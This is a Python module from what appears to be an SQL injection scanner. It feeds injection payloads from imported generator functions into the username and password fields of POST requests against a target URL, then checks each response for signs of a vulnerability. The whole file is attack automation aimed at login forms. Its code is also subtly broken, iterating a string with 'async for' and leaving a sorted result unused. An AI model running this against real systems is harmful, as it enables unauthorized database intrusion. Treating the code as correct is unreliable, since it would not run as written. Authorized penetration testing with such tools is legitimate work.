import os
import sys
import requests
cur = os.getcwd()
sys.path.append(cur)
from lib.regelexpression.parampayloads import Bin_sql_param_payloads
from lib.regelexpression.parampayloads import conditional_blind_sql_param_payload
from lib.regelexpression.parampayloads import db_column_list_param_payload
from lib.regelexpression.parampayloads import db_column_payload_param
from lib.regelexpression.parampayloads import Error_http_req_param_payload
from lib.regelexpression.parampayloads import Extract_value_param_payload
from lib.regelexpression.parampayloads import host_name_oracle_payloads_param
from lib.regelexpression.parampayloads import make_set_sql_param_payload
from lib.regelexpression.parampayloads import oracle_database_ls_params
from lib.regelexpression.parampayloads import oracle_injection_payload_params
from lib.regelexpression.parampayloads import parameter_injection
from lib.regelexpression.parampayloads import substring_sql_payload_param
from lib.regelexpression.extractparameter import extract_parameter_name
from logger.sqljlog import logger as sqljlog
#/opt/homebrew/Cellar/sqlmap/1.7.12/libexec/data/txt/common-columns.txt
from logger.logs import logger
from lib.regelexpression.searchforvuln import detect_sql_injection as detector

class Parampayloads:
    def __init__(self):
        pass
    @staticmethod
    async def substring_payloads(url):
        parameter,_ = extract_parameter_name(url)
        payload : str = substring_sql_payload_param(url)
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)
        async for line in payload:
            if line == "":
                continue
            check = requests.get(url)
            if check.status_code == 200:
                logger.info(f"Host:{url}")
                params = {
                    "username":line,
                    "password":line
                }
                attack = requests.post(url=url,data=params)
                sqljlog.info(f"Testing:{line}")
                detector(attack.text)
            else:
                logger.critical("Host is down.")
        